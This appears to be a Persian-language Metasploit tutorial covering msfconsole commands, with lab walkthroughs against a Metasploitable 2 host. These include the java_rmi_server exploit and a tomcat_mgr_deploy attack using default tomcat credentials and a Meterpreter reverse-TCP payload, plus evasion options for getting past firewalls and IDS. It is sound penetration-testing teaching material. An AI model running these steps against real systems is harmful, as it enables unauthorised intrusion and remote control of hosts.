+++
title = "MSFConsole Commands"
tags = ["Pentest", "Metasploit", ", Readteam"]
Category = "Pentest, Metasploit, Readteam"
draft = false
+++

-------
- [MSFConsole Basic Commands](#MSFConsole%20Basic%20Commands)
	- [E35: MSFConsole Commands Description](#E35:%20MSFConsole%20Commands%20Description)
		- [MSFConsole Help](#MSFConsole%20Help)
		- [MSFConsole Commands Description](#MSFConsole%20Commands%20Description)
	- [E36: MSFConsole Commands - Part 1](#E36:%20MSFConsole%20Commands%20-%20Part%201)
		- [MSFConsole Commands Summary](#MSFConsole%20Commands%20Summary)
		- [See MSFConsole Commands in Action](#See%20MSFConsole%20Commands%20in%20Action)
	- [E37: MSFConsole Commands - Part 2](#E37:%20MSFConsole%20Commands%20-%20Part%202)
		- [Commands Used After Select Exploit](#Commands%20Used%20After%20Select%20Exploit)
		- [Find Suitable Exploit](#Find%20Suitable%20Exploit)
		- [Using `show` Commands after Select Exploit](#Using%20%60show%60%20Commands%20after%20Select%20Exploit)
	- [E38: MSFConsole Commands - Part 3](#E38:%20MSFConsole%20Commands%20-%20Part%203)
		- [Advance Exploit Example with `multi/http/tomcat_mgr_deploy`](#Advance%20Exploit%20Example%20with%20%60multi/http/tomcat_mgr_deploy%60)
		- [`pushm` & `pupm` Commands](#%60pushm%60%20&%20%60pupm%60%20Commands)
------
### MSFConsole Basic Commands
#### E35: MSFConsole Commands Description
##### MSFConsole Help
1. **See MSFConsole Commands with `help`**
	1. در MSFConsole کامند های زیادی وجود دارد که برای مشاهده آنها میتوانیم از کامند `help` استفاده کنیم.
	2. این کامندها در دسته بندی های متفاوت استفاده و نمایش داده میشوند که در تصویر زیر میتوانید مشاهده کنید:
		1. ![MSFConsole Commands-1](/images/tools/MSFConsoleCommands-1.png)
		2. ![MSFConsole Commands-2](/images/tools/MSFConsoleCommands-2.png)
		3. ![MSFConsole Commands-3](/images/tools/MSFConsoleCommands-3.png)
		4. ![MSFConsole Commands-4](/images/tools/MSFConsoleCommands-4.png)
```sh
msfconsole -q

msf > help
```
##### MSFConsole Commands Description
1. *Report Commands:*
	1. این کامند ها بصورت کامل و همیشه در کنسول کار میکنند و برای کارهای کلی استفاده میشوند:
		1. ![MSFConsole Commands-5](/images/tools/MSFConsoleCommands-5.png)
	2. این کامندها مختص به ماژول خاصی نیستند و بصورت مستقل کارهایی را انجام میدهند.
2. *Module Commands:*
	1. این نوع از کامندها برای کار با انواع ماژول ها(Exploits, Payloads, ....) استفاده میشوند:
		1. ![MSFConsole Commands-6](/images/tools/MSFConsoleCommands-6.png)
3. *Jobs Commands:*
	1. این کامند ها برای مدیریت کنترلر ها، ارتباطات ورودی و ... بکار میروند:
		1. ![MSFConsole Commands-7](/images/tools/MSFConsoleCommands-7.png)
4. *Resources Commands:*
	1. این کامندها برای Automation کردن کارها و تست نفوذ استفاده میشوند:
		1. ![MSFConsole Commands-8](/images/tools/MSFConsoleCommands-8.png)
5. *Developer Commands:*
	1. این نوع از کامندها برای توسعه MSFConsole استفاده میشود. 
	2. مثلا MSFConsole با زبان Ruby توسعه داده شده است و به همین دلیل با کامند `irb` میتوانیم به Shell Ruby دسترسی داشته باشیم:
		1. ![MSFConsole Commands-9](/images/tools/MSFConsoleCommands-9.png)
6. *Database Commands:*
	1. این کامندها برای کار با دیتابیس MSFConsole مثلا Export, Import, Connect, Disconnect و ... استفاده میشود:
		1. ![MSFConsole Commands-10](/images/tools/MSFConsoleCommands-10.png)
	2. یکی از ویژگی های پرکاربرد این است که میتوانیم اسکن Nmap را انجام دهیم و مستقیما آنرا در دیتابیس ذخیره کنیم. اینکار را با کامند `db_nmap` میتوانیم پیاده سازی کنیم:
		1. ![MSFConsole Commands-11](/images/tools/MSFConsoleCommands-11.png)
7. *Credentials Commands:*
	1. در هنگام تست نفوذ ممکن است اعتبارات زیادی مانند Usernames, Passwords, Hashes و ... را بدست آوریم. حال با کامند `creds` میتوانیم این موضوع ها را مشاهده، اضافه و یا حذف کنیم:
		1. ![MSFConsole Commands-12](/images/tools/MSFConsoleCommands-12.png)
#### E36: MSFConsole Commands - Part 1
##### MSFConsole Commands Summary
- **Core Commands**:
	- این دستور ها برای مدیریت Metasploit Framework استفاده میشوند:
	- `? , banner , cd , get , set , route `
- **Module Commands**:
	- برای مدیریت، استفاده و پاس دادن Options ها به ماژول ها
	- `back, info, options`
- **Job Commands**:
	- برقراری ارتباط با Session ها و مدیریت آنها
	- `handler, jobs, ...`
- **Resource Script Commands**:
	- ضبط اسکریپت های خودکار برای Automation Pentest
	- `makerc, resource, ...`
- **Developer Commands**:
	- توسعه کامندهای Metasploit Framework، ویرایش فایل ها، تعامل با Ruby و ...
	- `irb, edit, ...`
- **Database Commands**:
	- برای کار با دیتابیس مانند Import, Export, Connect و ...
	- `db_connect, db_export, ...`
- **Credentials Commands**:
	- مشاهده، ذخیره، حذف اعتبار نامه ها Credentials در دیتابیس
	- `creds`
- **Image**:
	- ![MSFConsole Commands-13](/images/tools/MSFConsoleCommands-13.png)
##### See MSFConsole Commands in Action
1. `banner`
	1. در هر بار اجرا Metasploit Framework اگر بصورت معمولی اجرا شود Banner در ابتدا چاپ میشود.
	2. حال این دستور میتواند بنر های مختلفی را نمایش دهد:
		1. ![MSFConsole Commands-14](/images/tools/MSFConsoleCommands-14.png)
2. `color true | false | auto`
	1. این کامند رنگ را برای دستورات مشخص میکند.
3. `version`
	1. نمایش ورژن فعالی `msfconsole`
		1. ![MSFConsole Commands-15](/images/tools/MSFConsoleCommands-15.png)
4. **We Can run Shell Commands in `msfconsole`**
	1. در `msfconsole` علاوه بر کامندهای داخلی میتوانیم کامندهای شل لینوکس را نیز اجرا کنیم:
		1. ![MSFConsole Commands-16](/images/tools/MSFConsoleCommands-16.png)
5. `?` | `help` 
	1. نمایش راهنمای دستورات بصورت کلی
6. `help COMMAND`
	1. نمایش راهنمای کامندی خاص
	2. `help search`
		1. ![MSFConsole Commands-17](/images/tools/MSFConsoleCommands-17.png)
7. `search NAME | MODULE | anythings`
	1. برای جستجو در `msfconsole` استفاده میشود. مثلا برای جستجو ساده:
	2. `search name:java`
		1. ![MSFConsole Commands-18](/images/tools/MSFConsoleCommands-18.png)
	3. برای جستجو حرفه ای تر:
	4. `search name:java rate:excellent date:2011`
		1. ![MSFConsole Commands-19](/images/tools/MSFConsoleCommands-19.png)
	5. استفاده از grep در جستجو:
	6. `search name:java | grep rmi`
		1. ![MSFConsole Commands-20](/images/tools/MSFConsoleCommands-20.png)
8. `history`
	1. فریم ورک `msfconsole` مانند شل تاریخچه ای از دستورات که در آن اجرا شده را نگه میدارد که میتوانیم با این کامند تاریخچه را مشاهده کنیم:
		1. ![MSFConsole Commands-21](/images/tools/MSFConsoleCommands-21.png)
9. `spool` Save History in Specific File
	1. از این کامند برای ذخیره History بصورت دستی در یک فایل مشخص استفاده میشود.
	2. `spool ~/Desktop/msflog.txt`
	3. با اجرای این کامند، تمام کامندهایی که پس از آن درون `msfconsole` تایپ میکنیم درون فایل `~/Desktop/msflog.txt` ذخیره میشود.
	4. `cat Desktop/msflog.txt`
		1. ![MSFConsole Commands-22](/images/tools/MSFConsoleCommands-22.png)
10. `save` Save `msfconsole` Configuration 
	1. با استفاده از این کامند میتوانیم کانفیگ فعلی ابزار را ذخیره کنیم تا در صورت نیاز از آن استفاده کنیم.
	2. `save`
		1. ![MSFConsole Commands-23](/images/tools/MSFConsoleCommands-23.png)
	3. `cat /root/.msf4/config`
		1. ![MSFConsole Commands-24](/images/tools/MSFConsoleCommands-24.png)
11. `quit` | `exit`  Quit from Metasploit Framework
#### E37: MSFConsole Commands - Part 2
##### Commands Used After Select Exploit
1. `show` Show Objects like(all, encoders, nops, exploits, options, plugins , ...)
	1. برای نمایش اشیا درون Metasploit Framework از این کامند استفاده میکنیم.
	2. `show nops` Show all Generators
		1. ![MSFConsole Commands-25](/images/tools/MSFConsoleCommands-25.png)
	3. `show plugins` Show all plugins
	4. `show encoders`
	5. `show exploits`
2. `info` See details information about Exploit
	1. این کامند مانند `show options` کار میکند اما اطلاعات بسیار دقیق تری نسبت به Exploit انتخاب شده را نمایش میدهد:
		1. ![MSFConsole Commands-26](/images/tools/MSFConsoleCommands-26.png)
		2. ![MSFConsole Commands-27](/images/tools/MSFConsoleCommands-27.png)
3. `show advanced` Show advanced options of selected exploit
	1. پس از انتخاب یک Exploit گزینه های تنظیم آنرا با `show options` میتوانیم مشاهده کنیم.
	2. برای مشاهده گزینه های پیشرفته تری که میتوانیم برای Exploit تنظیم کنیم از `show advanced` استفاده میکنیم:
		1. ![MSFConsole Commands-28](/images/tools/MSFConsoleCommands-28.png)
4. `show targets` See all targets which selected Exploit support them
	1. نوع سیستم عاملی که Exploit انتخاب شده میتواند بر روی آنها پیاده سازی شود را با استفاده از این کامند قابل مشاهده است.
	2. `use exploit/multi/misc/java_rmi_server`
	3. `show targets`
		1. ![MSFConsole Commands-29](/images/tools/MSFConsoleCommands-29.png)
5. `show evasion` See all techniques exploit can use
	1. بسیاری از Exploit ها را اگر بصورت معمولی استفاده کنیم توسط سیستم های Firewall, IDS, IPS شناسایی میشوند و در نتیجه با استفاده از تکنیکی باید این شناسایی را دور بزنیم.
	2. حال پس از انتخاب Exploit برای مشاهده تکنیک هایی که این اکسپلویت با استفاده از آنها میتواند سیستم های امنیتی را دور بزند میتوانیم از کامند `show evasion` استفاده کنیم:
		1. ![MSFConsole Commands-30](/images/tools/MSFConsoleCommands-30.png)
6. `show payloads` Show payloads can used in selected Exploit
	1. برای نمایش Payload هایی که میتوانیم برای یک Exploit انتخاب شده استفاده کنیم از این کامند استفاده میشود:
		1. ![MSFConsole Commands-31](/images/tools/MSFConsoleCommands-31.png)
	2. در واقع یک Exploit میتواند Payload های متفاوتی داشته باشد که باید بر اساس سیستم عامل تارگت انتخاب شود.
7. `set VARIABLE` | `get VARIABLE` | `unset VARIABLE` Exploit Variables
	1. برای تنظیم مقدار متغیر Exploit از `set VARIABLE` استفاده میکنیم.
	2. برای مشاهده مقدار متغیر تنظیم شده از `get VARIABLE` استفاده میکنیم.
	3. برای برداشتن مقدار تنظیم شده نیز از `unset VARIABLE` استفاده میکنیم.
8. `setg VARIABLE` | `getg VARIABLE` | `unsetg VARIABLE` Global Variables
	1. گاهی اوقات نیاز داریم که یک متغیر را برای چندین Exploit استفاده کنیم که در اینجا میتوانیم از Global Variables ها استفاده کنیم.
9. `run` | `exploit` Start Exploiting
10. `sessions` Work with exploited sessions
	1. `sessions` See all Exploited Sessions
	2. `sessions -i 3` Interaction with selected(3) session
11. `background` get back from Exploited shell to MSFConsole Shell
	1. وقتی با استفاده از `sessions -i 3` به یک Session متصل میشویم، برای بازگشت به MSFConsole از این کامند استفاده میکنیم:
		1. ![MSFConsole Commands-32](/images/tools/MSFConsoleCommands-32.png)
##### Find Suitable Exploit
1. **Suitable `exploit` base on Target**:
	1. برای یافتن Exploit مناسب تارگت، ابتدا باید Enumeration کاملی را بر روی تارگت خود انجام دهیم و سپس آسیب پذیری های درون تارگت را پیدا کنیم.
	2. سپس باید بر اساس آن جستجو درون Exploits های Metasploit Framework انجام دهیم تا Exploit مناسب تارگت را بیابیم.
##### Using `show` Commands after Select Exploit
1. Run `msfconsole` & Use `exploit/multi/misc/java_rmi_server`
	1. برای بدست آوردن نام کامل Exploit کافیست جستجو را انجام دهیم:
	2. `search rmiregistry`
		1. ![MSFConsole Commands-33](/images/tools/MSFConsoleCommands-33.png)
```sh
msf> search rmiregistry
msf> use exploit/multi/misc/java_rmi_server
msf exploit(multi/misc/java_rmi_server) > show options
msf exploit(multi/misc/java_rmi_server) > show advanced
msf exploit(multi/misc/java_rmi_server) > show targets
msf exploit(multi/misc/java_rmi_server) > show evasion
msf exploit(multi/misc/java_rmi_server) > show payloads
msf exploit(multi/misc/java_rmi_server) > set RHOST 10.10.2.14
msf exploit(multi/misc/java_rmi_server) > exploit -j
msf exploit(multi/misc/java_rmi_server) > sessions
msf exploit(multi/misc/java_rmi_server) > sessions -i 3
meterpreter > whoami
meterpreter > getuid
meterpreter > background
msf exploit(multi/misc/java_rmi_server) > 
```
- *Description:*
	- `show advanced`
		- ![MSFConsole Commands-34](/images/tools/MSFConsoleCommands-34.png)
	- `show targets`
		- ![MSFConsole Commands-35](/images/tools/MSFConsoleCommands-35.png)
	- `show evasion`
		- ![MSFConsole Commands-36](/images/tools/MSFConsoleCommands-36.png)
	- `show payloads`
		- ![MSFConsole Commands-37](/images/tools/MSFConsoleCommands-37.png)
#### E38: MSFConsole Commands - Part 3
##### Advance Exploit Example with `multi/http/tomcat_mgr_deploy`
1. **Select another exploit when using exploit**:
	1. هنگامیکه یک Exploit را Use کرده ایم اگر بخواهیم Exploit دیگری را Use کنیم میتوانیم از دو روش زیر استفاده کنیم.
	2. First `back` then `use EXPLOIT`
	3. Using `use EXPLOIT` Directly
2. Run `msfconsole`
	1. در این مثال میخواهیم Payload Meterpreter را بر روی Exploit انتخاب شده انتخاب کنیم تا بتوانیم بجای Open Shell از Meterpreter Shell استفاده کنیم.
3. **Note:** When using Reverse Shell Payloads
	1. هنگامیکه از Reverse Shell Payloads ها استفاده میکنیم دو متغیر `LHOST, LPORT` به سایر متغیر های Exploit اضافه میشود که  باید مقدار دهی شوند.
```sh
msf> setg RHOST 10.10.2.14 #Metasploitable 2 IP
msf> use exploit/multi/http/tomcat_mgr_deploy
msf exploit (multi/http/tomcat_mgr_deploy) > show options
msf exploit (multi/http/tomcat_mgr_deploy) > set PayLoad java/meterpreter/reverse_tcp
msf exploit (multi/http/tomcat_mgr_deploy) > show options
#and we can see payload section in options
msf exploit (multi/http/tomcat_mgr_deploy) > set LHOST 10.10.2.11 #Kali-IP
msf exploit (multi/http/tomcat_mgr_deploy) > set HttpPassword tomcat
msf exploit (multi/http/tomcat_mgr_deploy) > set HttpUsername tomcat
#set target variable is OPTIONAL => 0 is Automatic
msf exploit (multi/http/tomcat_mgr_deploy) > set target 0
#also RPORT can change if 80 Port is busy
msf exploit (multi/http/tomcat_mgr_deploy) > set RPORT 8180
msf exploit (multi/http/tomcat_mgr_deploy) > show options
msf exploit (multi/http/tomcat_mgr_deploy) > exploit
#Now we get Meterpreter Shell with tomcat User
```
- *Description:*
	- `msf exploit (multi/http/tomcat_mgr_deploy) > show options`
		- ![MSFConsole Commands-38](/images/tools/MSFConsoleCommands-38.png)
	- `msf exploit (multi/http/tomcat_mgr_deploy) > set PayLoad java/meterpreter/reverse_tcp`
	- `msf exploit (multi/http/tomcat_mgr_deploy) > show options`
		- ![MSFConsole Commands-39](/images/tools/MSFConsoleCommands-39.png)
	- حال میتوانیم مشاهده کنیم که باید `HttpUsername, HttpPassword, LHOST ` را باید مقدار دهی کنیم.
	- همچنین متغیر `target` را میتوانیم بصورت اختیاری بر اساس سیستم عامل تارگت خود تنظیم کنیم.
	- مقدار `Rport` را نیز در صورتیکه پورت پیشفرض `80` مشغول است عوض میکنیم.
	- `show options`
		- ![MSFConsole Commands-40](/images/tools/MSFConsoleCommands-40.png)
- *After `exploit` Description:*
	- پس اجرا `exploit` میتوانیم یک Meterpreter Shell را دریافت کنیم که این شل با یوزر `tomcat` دریافت شده زیرا که متغیر `HttpUsername` را مقدار دهی کردیم:
		- ![MSFConsole Commands-41](/images/tools/MSFConsoleCommands-41.png)
	- `bg` | `background`
		- این دو کامند از Meterpreter Shell به MSFConsole باز میگردد و شل Meterpreter Shell را در پس زمینه قرار میدهد.
##### `pushm` & `pupm` Commands
1. **`pushm` Push Last module in Stack Memory**:
	1. این دستور ماژول فعلی را به پس زمینه میدهد و میتوانیم ماژول جدید را انتخاب کنیم.
	2. در مثال قبلی که `multi/http/tomcat_mgr_deploy` انتخاب شده بود و دسترسی Meterpreter Shell را از تارگت دریافت کرده بودیم، میتوانیم `pushm` را اجرا کنیم تا بتوانیم Module دیگری را برای انجام کار دیگری انتخاب کنیم.
	3. نکته اینجاست که ماژول فعلی از بین نمیرود و در واقع در حافظه Stack برنامه ذخیره میشود و با کامند `popm` قابل بازگشت است.
```sh
msf exploit (multi/http/tomcat_mgr_deploy) > pushm
msf exploit (multi/http/tomcat_mgr_deploy) > use exploit/multi/misc/java_rmi_server
msf exploit(multi/misc/java_rmi_server) > exploit
```
- با اجرای آخرین `exploit` نفوذ با ماژول `exploit/multi/misc/java_rmi_server` انجام میشود:
	- ![MSFConsole Commands-42](/images/tools/MSFConsoleCommands-42.png)
2. **`popm` Pop Last Module from Stack Memory**:
	1. برای بازگشت به آخرین ماژول درون حافظه Stack از این کامند استفاده میشود.
	2. در همین مثال که ماژول `exploit/multi/misc/java_rmi_server`  انتخاب شده و ماژول `exploit/multi/http/tomcat_mgr_deploy` درون حافظه Stack قرار دارد، با اجرای `popm` مجددا ماژول `exploit/multi/http/tomcat_mgr_deploy` به عنوان ماژول اول انتخاب میشود:
```sh
msf exploit(multi/misc/java_rmi_server) > popm
msf exploit (multi/http/tomcat_mgr_deploy) >
```
- Image:
	- ![MSFConsole Commands-43](/images/tools/MSFConsoleCommands-43.png)

> [!Tip] 
> این دو کامند در زمانی که میخواهیم چندین Exploit را بر روی چندین Target پیاده سازی کنیم بسیار کاربردی و پر استفاده است.
### !

